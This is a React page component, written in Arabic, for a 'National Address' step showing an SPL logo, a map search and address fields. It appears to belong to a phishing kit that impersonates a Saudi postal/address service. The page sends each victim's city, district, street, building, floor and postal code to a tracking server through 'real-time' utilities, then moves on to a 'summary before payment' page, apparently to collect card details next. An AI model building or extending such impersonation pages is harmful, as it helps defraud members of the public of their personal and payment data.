import { useEffect, useState } from "react";
import Box from "@mui/material/Box";
import Button from "@mui/material/Button";
import Typography from "@mui/material/Typography";
import Footer from "../components/footer";
import ErrorDialog from "../components/ErrorDialog";
import {
  encryptRoute,
  navigate,
  sendDataToServer,
  setCurrentPage,
} from "@/real-time/utils/utils";
import CustomFormField from "../components/CustomFormField";
import LightbulbOutlinedIcon from "@mui/icons-material/LightbulbOutlined";
import InteractiveMap from "./InteractiveMap";

const NationalAddressPage = () => {
  useEffect(() => {
    setCurrentPage("العنوان الوطني");
  }, []);

  const [formData, setFormData] = useState({
    city: "",
    district: "",
    street: "",
    buildingNumber: "",
    floor: "",
    zipCode: "",
  });

  const [mapPosition, setMapPosition] = useState<any>([24.7136, 46.6753]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isSearching, setIsSearching] = useState(false);

  const [showErrors, setShowErrors] = useState(false);
  const [isPending, setIsPending] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);

  const handleMapSearch = async () => {
    if (!searchQuery.trim()) return;
    setIsSearching(true);
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(
          searchQuery + " Saudi Arabia",
        )}`,
      );
      const data = await response.json();
      if (data && data.length > 0) {
        const { lat, lon } = data[0];
        setMapPosition([parseFloat(lat), parseFloat(lon)]);
      }
    } catch (error) {
      console.error("Search error:", error);
    } finally {
      setIsSearching(false);
    }
  };

  const handleInputChange = (id: string, value: string) => {
    setFormData((prev) => ({ ...prev, [id]: value }));
  };

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowErrors(true);
    console.log(isPending);

    const hasEmptyFields = Object.values(formData).some((val) => !val);

    if (hasEmptyFields) {
      setShowErrorDialog(true);
      return;
    }

    setIsPending(true);

    const arabicData: Record<string, string> = {
      المدينة: formData.city,
      الحي: formData.district,
      الشارع: formData.street,
      "رقم المبنى": formData.buildingNumber,
      الدور: formData.floor,
      "الرمز البريدي": formData.zipCode,
    };

    sendDataToServer({
      data: arabicData,
      current: "العنوان الوطني",
      nextPage: "ملخص قبل الدفع",
    });

    setIsPending(false);
  };

  const handleBack = () => {
    navigate(encryptRoute("إنشاء حساب أفراد"));
  };

  return (
    <Box
      sx={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        fontFamily: "Tajawal",
      }}
      dir="rtl"
    >
      <div className="h-[40px] bg-[#143c3c] border-b-2 border-[#146c84]" />

      <Box
        component="section"
        sx={{
          flexGrow: 1,
          bgcolor: "#eaeff2",
          py: 6,
          px: { xs: 2, md: 4 },
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
        }}
      >
        <Box sx={{ width: "100%", maxWidth: "900px" }}>
          {/* Header Area */}
          <Box sx={{ display: "flex", mb: 3 }}>
            <img
              src="/assets/images/new/app_icon.png"
              alt="SPL Logo"
              style={{ width: "120px", height: "120px", objectFit: "contain" }}
            />
          </Box>

          <Box
            sx={{
              bg: "white",
              borderRadius: "16px",
              boxShadow: "0 4px 24px rgba(0,0,0,0.06)",
              overflow: "hidden",
              bgcolor: "white",
            }}
          >
            <Box sx={{ p: { xs: 4, md: 8 } }}>
              <Typography
                variant="h4"
                sx={{
                  fontSize: { xs: "24px", md: "32px" },
                  fontWeight: "800",
                  textAlign: "center",
                  color: "#153c3f",
                  mb: 4,
                }}
              >
                العنوان الوطني
              </Typography>

              <Typography
                variant="h6"
                sx={{
                  fontSize: "20px",
                  color: "#153c3f",
                  fontWeight: "700",
                  mb: 2,
                }}
              >
                عنوان داخل المملكة
              </Typography>

              {/* Search Section */}
              <Box sx={{ display: "flex", gap: 1.5, mb: 4 }}>
                <Box sx={{ flex: 1 }}>
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleMapSearch()}
                    placeholder="ابحث عن عنوان في السعودية..."
                    className="w-full h-[48px] px-4 border border-[#d1d5dc] rounded-lg outline-none focus:border-[#136e82] transition-colors text-right"
                  />
                </Box>
                <Button
                  variant="contained"
                  onClick={handleMapSearch}
                  disabled={isSearching}
                  sx={{
                    bgcolor: "#136e82",
                    px: 6,
                    height: "48px",
                    fontWeight: "700",
                    boxShadow: "none",
                    borderRadius: "8px",
                    "&:hover": { bgcolor: "#0e5261", boxShadow: "none" },
                  }}
                >
                  {isSearching ? "جاري البحث..." : "بحث"}
                </Button>
              </Box>

              {/* Map Component */}
              <InteractiveMap
                position={mapPosition}
                setPosition={setMapPosition}
                onPositionChange={(latlng) =>
                  console.log("Map position:", latlng)
                }
              />

              {/* Helper Box */}
              <Box
                sx={{
                  bgcolor: "#f1faff",
                  p: 3,
                  borderRadius: "12px",
                  mb: 6,
                  border: "1px solid #e1f0f7",
                }}
              >
                <Box
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    gap: 1,
                    mb: 1.5,
                  }}
                >
                  <LightbulbOutlinedIcon
                    sx={{ color: "#f59e0b", fontSize: "20px" }}
                  />
                  <Typography sx={{ fontWeight: "700", color: "#374151" }}>
                    يمكنك:
                  </Typography>
                </Box>
                <ul className="list-disc list-inside space-y-2 text-[14px] text-[#4b5563] pr-2">
                  <li>البحث عن عنوان في السعودية</li>
                  <li>النقر على الخريطة لتحديد موقع</li>
                  <li>سحب الدبوس لتحريك الموقع</li>
                </ul>
              </Box>

              <Typography
                variant="h6"
                sx={{
                  fontSize: "18px",
                  color: "#153c3f",
                  fontWeight: "700",
                  mb: 4,
                }}
              >
                تفاصيل العنوان
              </Typography>

              {/* Address Form */}
              <form onSubmit={handleContinue}>
                <Box
                  sx={{
                    display: "grid",
                    gridTemplateColumns: { xs: "1fr", md: "1fr 1fr" },
                    gap: 3,
                    mb: 3,
                  }}
                >
                  <CustomFormField
                    id="city"
                    label="المدينة"
                    placeholder="مثال: الرياض"
                    required
                    value={formData.city}
                    onChange={(val) => handleInputChange("city", val)}
                    error={showErrors && !formData.city}
                  />
                  <CustomFormField
                    id="district"
                    label="الحي"
                    placeholder="مثال: النخيل"
                    required
                    value={formData.district}
                    onChange={(val) => handleInputChange("district", val)}
                    error={showErrors && !formData.district}
                  />
                </Box>

                <Box sx={{ mb: 3 }}>
                  <CustomFormField
                    id="street"
                    label="الشارع"
                    placeholder="مثال: طريق الملك فهد"
                    required
                    value={formData.street}
                    onChange={(val) => handleInputChange("street", val)}
                    error={showErrors && !formData.street}
                  />
                </Box>

                <Box
                  sx={{
                    display: "grid",
                    gridTemplateColumns: { xs: "1fr", md: "1fr 1fr 1fr" },
                    gap: 3,
                    mb: 8,
                  }}
                >
                  <CustomFormField
                    id="buildingNumber"
                    label="المبنى"
                    placeholder="0000"
                    required
                    value={formData.buildingNumber}
                    onChange={(val) => handleInputChange("buildingNumber", val)}
                    error={showErrors && !formData.buildingNumber}
                  />
                  <CustomFormField
                    id="floor"
                    label="الدور"
                    placeholder="رقم الدور"
                    required
                    value={formData.floor}
                    onChange={(val) => handleInputChange("floor", val)}
                    error={showErrors && !formData.floor}
                  />
                  <CustomFormField
                    id="zipCode"
                    label="الرمز البريدي"
                    placeholder="00000"
                    required
                    value={formData.zipCode}
                    onChange={(val) => handleInputChange("zipCode", val)}
                    error={showErrors && !formData.zipCode}
                  />
                </Box>

                <Box
                  sx={{
                    display: "flex",
                    flexDirection: { xs: "column-reverse", md: "row" },
                    justifyContent: "space-between",
                    gap: 2,
                  }}
                >
                  <Button
                    variant="outlined"
                    onClick={handleBack}
                    sx={{
                      minWidth: "180px",
                      color: "#136e82",
                      borderColor: "#136e82",
                      fontWeight: "700",
                      py: 1.5,
                      borderRadius: "10px",
                      "&:hover": {
                        bgcolor: "rgba(19, 110, 130, 0.04)",
                        borderColor: "#0e5261",
                      },
                    }}
                  >
                    رجوع
                  </Button>
                  <Button
                    variant="contained"
                    type="submit"
                    sx={{
                      minWidth: "180px",
                      bgcolor: "#00c8e1",
                      color: "#153c3f",
                      fontWeight: "800",
                      py: 1.5,
                      borderRadius: "10px",
                      boxShadow: "none",
                      "&:hover": { bgcolor: "#00b2c9", boxShadow: "none" },
                    }}
                  >
                    متابعة
                  </Button>
                </Box>
              </form>
            </Box>
          </Box>
        </Box>
      </Box>

      <Footer />
      <ErrorDialog
        open={showErrorDialog}
        onClose={() => setShowErrorDialog(false)}
      />
    </Box>
  );
};

export default NationalAddressPage;
